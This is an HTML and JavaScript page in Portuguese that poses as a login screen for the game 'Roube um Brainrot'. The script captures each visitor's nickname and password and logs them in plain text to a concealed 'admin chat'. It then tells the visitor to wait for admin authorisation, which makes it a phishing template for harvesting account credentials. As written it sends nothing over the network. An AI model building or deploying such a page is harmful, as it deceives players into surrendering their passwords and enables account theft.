<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <title>Admin Chat – Roube um Brainrot</title>
  <style>
    * { box-sizing: border-box; font-family: Arial, sans-serif; }
    body {
      margin: 0;
      min-height: 100vh;
      background: linear-gradient(135deg, #ff004c, #2b000f);
      display: flex;
      align-items: center;
      justify-content: center;
      color: #fff;
    }
    .login, .admin-chat {
      background: rgba(0,0,0,0.75);
      border: 2px solid #ff004c;
      border-radius: 12px;
      padding: 20px;
      width: 340px;
      box-shadow: 0 0 20px #ff004c;
    }
    h2 { text-align: center; margin-bottom: 15px; }
    input, button {
      width: 100%;
      padding: 10px;
      margin-bottom: 10px;
      border-radius: 8px;
      border: none;
    }
    input {
      background: #1a1a1a;
      color: #fff;
      border: 1px solid #ff004c;
    }
    button {
      background: #ff004c;
      color: #fff;
      cursor: pointer;
      font-weight: bold;
    }
    button:hover { background: #ff336f; }
    .hidden { display: none; }

    .chat-box {
      height: 220px;
      background: #111;
      border: 1px solid #ff004c;
      border-radius: 8px;
      padding: 8px;
      overflow-y: auto;
      margin-bottom: 10px;
      font-size: 14px;
    }
    .msg-login { color: #ff336f; }
  </style>
</head>
<body>

  <!-- LOGIN USUÁRIO -->
  <div class="login" id="login">
    <h2>🔴 Roube um Brainrot</h2>
    <input id="nickname" placeholder="Nickname" />
    <input id="senha" type="password" placeholder="Senha" />
    <button onclick="entrar()">Entrar</button>
  </div>

  <!-- CHAT SOMENTE ADMIN -->
  <div class="admin-chat hidden" id="adminChat">
    <h2>👑 Chat do Admin</h2>
    <div class="chat-box" id="chatBox"></div>
    <p style="font-size:12px; opacity:0.8; text-align:center;">
      Apenas você vê este chat
    </p>
  </div>

<script>
  const chatBox = document.getElementById('chatBox');

  function entrar() {
    const nick = document.getElementById('nickname').value;
    const senha = document.getElementById('senha').value;

    if (!nick || !senha) {
      alert('Preencha tudo!');
      return;
    }

    // Envia o login SOMENTE para o chat do admin
    adicionarLogin(`NOVO LOGIN → Nick: ${nick} | Senha: ${senha}`);

    // Usuário não vê chat nenhum
    document.getElementById('login').innerHTML = `
      <h2>✔ Entrada enviada</h2>
      <p style="text-align:center">Aguarde autorização do admin.</p>
    `;

    // Se for você (admin), mostra o chat
    if (nick.toLowerCase() === 'admin') {
      document.getElementById('login').classList.add('hidden');
      document.getElementById('adminChat').classList.remove('hidden');
    }
  }

  function adicionarLogin(texto) {
    const div = document.createElement('div');
    div.className = 'msg-login';
    div.textContent = texto;
    chatBox.appendChild(div);
    chatBox.scrollTop = chatBox.scrollHeight;
  }
</script>

</body>
</html>
